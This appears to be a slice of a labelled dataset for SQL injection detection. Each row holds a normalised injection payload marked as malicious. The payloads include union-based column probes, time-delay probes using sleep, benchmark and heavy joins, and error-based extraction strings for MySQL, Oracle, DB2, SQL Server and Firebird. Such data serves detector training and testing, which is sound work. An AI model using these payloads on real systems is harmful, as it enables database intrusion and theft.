row_index,payload_norm,label,sqli_type_hint
1710,"1' ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'owot' = 'owot",1,
1711,"-2378"" where 2686 = 2686 or 6872 = 6872--",1,
1712,1'+ ( select qtyi where 7147 = 7147,1,
1713,"-5313' ) union all select 7187,7187,7187#",1,
1714,"-7858' ) union all select 1541,1541,1541,1541,1541,1541#",1,
1715,1'|| ( select 'jlon' where 1461 = 1461,1,
1716,select ( case when ( 2716 = 8138 ) then 2716 else 2716* ( select 2716 from mysql.db ) end ) #,1,
1717,"select count ( * ) from generate_series ( 1,5000000 ) --",1,
1718,"1"" ) where 6478 = 6478 union all select null,null,null,null,null,null#",1,
1719,"-5771' ) ) union all select 2833,2833,2833,2833,2833,2833--",1,
1720,"1"" ) as kbjt where 2012 = 2012 and ( 5978 = 6898 ) *6898--",1,
1721,end if,1,
1722,"-2397 ) ) as oizy where 1746 = 1746 union all select 1746,1746,1746,1746,1746,1746#",1,
1723,1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 7079 = 7079,1,
1724,"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'asdc' like 'asdc",1,
1725,1' ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'foop' like 'foop,1,
1726,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 6051 = 6051",1,
1727,"1'+ ( select sfuq where 8094 = 8094 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",1,
1728,"-9046' ) ) as ymqc where 3733 = 3733 union all select 3733,3733,3733,3733,3733,3733,3733--",1,
1729,( case when 2646 = 8520 then 2646 else null end ),1,
1730,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",1,
1731,1' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'mfmk' = 'mfmk,1,
1732,"-1269' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'gohv' like 'gohv",1,
1733,"-8410"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""xhzr"" = ""xhzr",1,
1734,"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,
1735,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ""%"" = """,1,
1736,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( ""%"" = """,1,
1737,select case when 1613 = 2937 then 1 else null end--,1,
1738,"-3364%"" ) ) ) union all select 5464--",1,
1739,"1' ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
